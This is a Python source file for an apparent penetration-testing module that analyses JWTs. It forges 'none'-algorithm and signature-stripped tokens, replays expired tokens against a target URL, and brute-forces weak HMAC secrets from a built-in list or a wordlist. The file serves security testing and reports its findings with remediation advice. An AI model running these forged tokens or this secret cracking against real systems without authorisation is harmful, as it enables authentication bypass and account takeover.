#!/usr/bin/env python3
"""
JWT (JSON Web Token) vulnerability testing module.

Usage:
    python jwt_tester.py --token "eyJ..." --target https://example.com/api --output results/
"""

import argparse
import asyncio
import base64
import json
import hmac
import hashlib
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("jwt_tester")


@dataclass
class JWTVulnerability:
    """Represents a discovered JWT vulnerability."""

    vuln_type: str  # none_algorithm, weak_secret, algorithm_confusion, expired_accepted, etc.
    description: str
    original_token: str
    modified_token: str = ""
    evidence: str = ""
    confidence: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "vuln_type": self.vuln_type,
            "description": self.description,
            "original_token": self.original_token[:50] + "...",
            "modified_token": self.modified_token[:50] + "..." if self.modified_token else "",
            "evidence": self.evidence[:500] if self.evidence else "",
            "confidence": self.confidence,
        }


class JWTTester:
    """
    JWT vulnerability tester.

    Features:
    - None algorithm bypass
    - Algorithm confusion (RS256 to HS256)
    - Weak secret detection
    - Expired token acceptance
    - Signature stripping
    - Header injection
    """

    # Common weak JWT secrets
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "key",
        "jwt_secret", "jwt_key", "token_secret", "auth_key",
        "supersecret", "changeme", "qwerty", "letmein",
        "test", "example", "demo", "development",
        "your-256-bit-secret", "your-secret-key",
        "", "null", "undefined", "none",
    ]

    def __init__(
        self,
        token: str,
        target: Optional[str] = None,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        wordlist: Optional[str] = None,
        verbose: bool = False,
    ):
        self.token = token.strip()
        self.target = normalize_url(target) if target else None
        self.target_domain = extract_domain(target) if target else "jwt_analysis"
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.wordlist = wordlist
        self.verbose = verbose

        self.vulnerabilities: List[JWTVulnerability] = []
        self.header: Dict = {}
        self.payload: Dict = {}
        self.signature: str = ""
        self.cracked_secret: Optional[str] = None

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run JWT tests and return results."""
        result = ScanResult(
            tool="jwt_tester",
            target=self.target or "JWT Analysis",
            config={
                "timeout": self.timeout,
                "has_target": bool(self.target),
            },
        )

        logger.info("Starting JWT security analysis...")

        try:
            # Parse the JWT
            if not self._parse_jwt():
                result.add_error("Failed to parse JWT token")
                result.finalize()
                return result

            logger.info(f"JWT Header: {self.header}")
            logger.info(f"JWT Algorithm: {self.header.get('alg', 'unknown')}")

            # Static analysis
            self._analyze_header()
            self._analyze_payload()

            # Test none algorithm
            await self._test_none_algorithm()

            # Test algorithm confusion
            await self._test_algorithm_confusion()

            # Test weak secrets
            await self._test_weak_secrets()

            # Test signature stripping
            await self._test_signature_stripping()

            # Test expired token
            await self._test_expired_token()

            # Statistics
            result.stats = {
                "vulnerabilities_found": len(self.vulnerabilities),
                "algorithm": self.header.get("alg", "unknown"),
                "secret_cracked": self.cracked_secret is not None,
                "by_type": self._count_by_type(),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.CRITICAL if vuln.vuln_type in ["none_algorithm", "weak_secret"] else Severity.HIGH

                result.add_finding(Finding(
                    title=f"JWT Vulnerability: {vuln.vuln_type.replace('_', ' ').title()}",
                    severity=severity,
                    description=vuln.description,
                    url=self.target or "N/A",
                    evidence=vuln.evidence,
                    metadata={
                        "vuln_type": vuln.vuln_type,
                        "confidence": vuln.confidence,
                        "modified_token": vuln.modified_token[:100] if vuln.modified_token else "",
                    },
                    cwe_id="CWE-287",
                    remediation="Use strong secrets, validate algorithms server-side, check token expiration.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    def _parse_jwt(self) -> bool:
        """Parse JWT token into components."""
        try:
            parts = self.token.split('.')
            if len(parts) != 3:
                logger.error("Invalid JWT format (expected 3 parts)")
                return False

            # Decode header
            header_b64 = parts[0]
            header_json = base64.urlsafe_b64decode(header_b64 + '==')
            self.header = json.loads(header_json)

            # Decode payload
            payload_b64 = parts[1]
            payload_json = base64.urlsafe_b64decode(payload_b64 + '==')
            self.payload = json.loads(payload_json)

            # Store signature
            self.signature = parts[2]

            return True

        except Exception as e:
            logger.error(f"Failed to parse JWT: {e}")
            return False

    def _analyze_header(self):
        """Analyze JWT header for issues."""
        alg = self.header.get("alg", "")

        # Check for weak algorithms
        if alg.lower() == "none":
            self.vulnerabilities.append(JWTVulnerability(
                vuln_type="none_algorithm",
                description="Token uses 'none' algorithm, allowing unsigned tokens",
                original_token=self.token,
                confidence="high",
            ))

        if alg in ["HS256", "HS384", "HS512"]:
            # HMAC algorithms are susceptible to brute force
            self.vulnerabilities.append(JWTVulnerability(
                vuln_type="hmac_algorithm",
                description=f"Token uses {alg} (HMAC). Consider using RS256 for better security.",
                original_token=self.token,
                confidence="low",
            ))

        # Check for jku/jwk header injection risks
        if "jku" in self.header:
            self.vulnerabilities.append(JWTVulnerability(
                vuln_type="jku_header",
                description="Token contains 'jku' header which could allow key injection",
                original_token=self.token,
                evidence=f"jku: {self.header['jku']}",
                confidence="medium",
            ))

        if "jwk" in self.header:
            self.vulnerabilities.append(JWTVulnerability(
                vuln_type="jwk_header",
                description="Token contains embedded 'jwk' which could allow key injection",
                original_token=self.token,
                confidence="medium",
            ))

        if "kid" in self.header:
            # kid could be vulnerable to injection
            kid = self.header["kid"]
            if any(c in str(kid) for c in ["'", '"', ";", "|", "&", "/", ".."]):
                self.vulnerabilities.append(JWTVulnerability(
                    vuln_type="kid_injection",
                    description="'kid' header contains potentially injectable characters",
                    original_token=self.token,
                    evidence=f"kid: {kid}",
                    confidence="medium",
                ))

    def _analyze_payload(self):
        """Analyze JWT payload for issues."""
        import time

        # Check expiration
        exp = self.payload.get("exp")
        if exp:
            if exp < time.time():
                self.vulnerabilities.append(JWTVulnerability(
                    vuln_type="expired_token",
                    description="Token is expired but may still be accepted",
                    original_token=self.token,
                    evidence=f"Expired at: {exp}",
                    confidence="low",
                ))
        else:
            self.vulnerabilities.append(JWTVulnerability(
                vuln_type="no_expiration",
                description="Token has no expiration claim ('exp')",
                original_token=self.token,
                confidence="medium",
            ))

        # Check for sensitive data
        sensitive_fields = ["password", "secret", "key", "ssn", "credit_card"]
        for field in sensitive_fields:
            if field in str(self.payload).lower():
                self.vulnerabilities.append(JWTVulnerability(
                    vuln_type="sensitive_data",
                    description=f"Token payload may contain sensitive data ({field})",
                    original_token=self.token,
                    confidence="low",
                ))
                break

    async def _test_none_algorithm(self):
        """Test if server accepts none algorithm."""
        if not self.target:
            return

        logger.info("Testing 'none' algorithm bypass...")

        # Create token with none algorithm
        modified_header = self.header.copy()
        modified_header["alg"] = "none"

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(modified_header).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(self.payload).encode()
        ).rstrip(b'=').decode()

        # Try different signature variants
        none_tokens = [
            f"{header_b64}.{payload_b64}.",
            f"{header_b64}.{payload_b64}.{self.signature}",
            f"{header_b64}.{payload_b64}",
        ]

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            for none_token in none_tokens:
                try:
                    response = await client.get(
                        self.target,
                        headers={"Authorization": f"Bearer {none_token}"}
                    )

                    if response.status == 200:
                        self.vulnerabilities.append(JWTVulnerability(
                            vuln_type="none_algorithm",
                            description="Server accepts JWT with 'none' algorithm",
                            original_token=self.token,
                            modified_token=none_token,
                            evidence=f"HTTP {response.status} with none algorithm token",
                            confidence="high",
                        ))
                        logger.info("None algorithm bypass CONFIRMED!")
                        return

                except Exception as e:
                    logger.debug(f"Error testing none algorithm: {e}")

    async def _test_algorithm_confusion(self):
        """Test for algorithm confusion (RS256 to HS256)."""
        if not self.target:
            return

        alg = self.header.get("alg", "")
        if not alg.startswith("RS"):
            return

        logger.info("Testing algorithm confusion (RS256 -> HS256)...")

        # This would require the public key to sign with HS256
        # Just note the potential vulnerability
        self.vulnerabilities.append(JWTVulnerability(
            vuln_type="algorithm_confusion_potential",
            description=f"Token uses {alg}. Test RS256 to HS256 confusion with public key.",
            original_token=self.token,
            confidence="low",
        ))

    async def _test_weak_secrets(self):
        """Test for weak HMAC secrets."""
        alg = self.header.get("alg", "")
        if not alg.startswith("HS"):
            return

        logger.info("Testing weak secrets...")

        # Load wordlist if provided
        secrets = self.WEAK_SECRETS.copy()
        if self.wordlist and Path(self.wordlist).exists():
            with open(self.wordlist) as f:
                secrets.extend([line.strip() for line in f if line.strip()])

        # Try to crack the secret
        header_payload = self.token.rsplit('.', 1)[0]

        for secret in secrets[:1000]:  # Limit to prevent long runs
            if self._verify_signature(header_payload, self.signature, secret, alg):
                self.cracked_secret = secret
                self.vulnerabilities.append(JWTVulnerability(
                    vuln_type="weak_secret",
                    description=f"JWT secret cracked: '{secret}'",
                    original_token=self.token,
                    evidence=f"Secret: {secret}",
                    confidence="high",
                ))
                logger.info(f"Secret CRACKED: {secret}")
                break

    def _verify_signature(self, data: str, signature: str, secret: str, alg: str) -> bool:
        """Verify HMAC signature with given secret."""
        try:
            if alg == "HS256":
                hash_func = hashlib.sha256
            elif alg == "HS384":
                hash_func = hashlib.sha384
            elif alg == "HS512":
                hash_func = hashlib.sha512
            else:
                return False

            expected_sig = hmac.new(
                secret.encode(),
                data.encode(),
                hash_func
            ).digest()

            expected_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b'=').decode()

            return hmac.compare_digest(expected_b64, signature)

        except Exception:
            return False

    async def _test_signature_stripping(self):
        """Test if server accepts token without signature."""
        if not self.target:
            return

        logger.info("Testing signature stripping...")

        # Token without signature
        stripped_token = self.token.rsplit('.', 1)[0] + "."

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            try:
                response = await client.get(
                    self.target,
                    headers={"Authorization": f"Bearer {stripped_token}"}
                )

                if response.status == 200:
                    self.vulnerabilities.append(JWTVulnerability(
                        vuln_type="signature_not_verified",
                        description="Server accepts JWT with stripped/empty signature",
                        original_token=self.token,
                        modified_token=stripped_token,
                        evidence=f"HTTP {response.status}",
                        confidence="high",
                    ))
                    logger.info("Signature stripping CONFIRMED!")

            except Exception as e:
                logger.debug(f"Error testing signature stripping: {e}")

    async def _test_expired_token(self):
        """Test if server accepts expired tokens."""
        if not self.target:
            return

        import time
        exp = self.payload.get("exp")
        if not exp or exp > time.time():
            return

        logger.info("Testing expired token acceptance...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            try:
                response = await client.get(
                    self.target,
                    headers={"Authorization": f"Bearer {self.token}"}
                )

                if response.status == 200:
                    self.vulnerabilities.append(JWTVulnerability(
                        vuln_type="expired_accepted",
                        description="Server accepts expired JWT tokens",
                        original_token=self.token,
                        evidence=f"HTTP {response.status} with expired token",
                        confidence="high",
                    ))
                    logger.info("Expired token acceptance CONFIRMED!")

            except Exception as e:
                logger.debug(f"Error testing expired token: {e}")

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.vuln_type] = counts.get(vuln.vuln_type, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"jwt_{self.target_domain}")

        # Save JWT analysis
        analysis_path = self.output_dir / f"jwt_analysis_{self.target_domain}.json"
        with open(analysis_path, "w") as f:
            json.dump(
                {
                    "timestamp": timestamp_now(),
                    "header": self.header,
                    "payload": self.payload,
                    "algorithm": self.header.get("alg"),
                    "cracked_secret": self.cracked_secret,
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["analysis"] = str(analysis_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="JWT (JSON Web Token) vulnerability tester"
    )
    parser.add_argument("--token", required=True, help="JWT token to analyze")
    parser.add_argument("-t", "--target", help="Target URL to test token against")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("-w", "--wordlist", help="Wordlist for secret cracking")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    tester = JWTTester(
        token=args.token,
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        wordlist=args.wordlist,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"JWT Analysis Complete")
    print(f"{'='*60}")
    print(f"Algorithm: {tester.header.get('alg', 'unknown')}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    if tester.cracked_secret:
        print(f"*** SECRET CRACKED: {tester.cracked_secret} ***")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** VULNERABILITIES ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.vuln_type}")


if __name__ == "__main__":
    asyncio.run(main())
